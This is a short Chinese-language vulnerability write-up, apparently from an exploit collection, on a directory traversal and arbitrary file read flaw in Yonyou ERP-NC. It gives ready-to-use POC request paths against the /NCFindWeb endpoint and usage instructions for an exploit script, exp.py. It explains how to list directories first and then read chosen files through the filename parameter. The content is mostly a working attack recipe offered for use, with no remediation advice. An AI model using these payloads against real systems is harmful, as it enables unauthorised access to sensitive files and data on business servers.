



# 用友ERP-NC目录遍历及任意文件读取

## 漏洞简介

用友ERP-NC 存在目录遍历漏洞，攻击者可以通过目录遍历获取敏感文件信息

## 漏洞影响

用友ERP-NC

## POC

```
/NCFindWeb?service=IPreAlertConfigService&filename=
/NCFindWeb?service=IPreAlertConfigService&filename=filename
```

## 脚本使用

```
Usage: exp.py [OPTIONS]

Options:
  -u, --url TEXT       目标url
  -f, --filename TEXT  读取文件的名字
  --help               Show this message and exit.
```

目录遍历：

```bash
python3 exp.py --url http://127.0.0.1
```

任意文件读取：

```bash
python3 exp.py --url http://127.0.0.1 --filename a.txt
```

读取文件内容时，可以通过先目录遍历获取文件路径，读取文件内容时，将文件路径传递给filename 参数





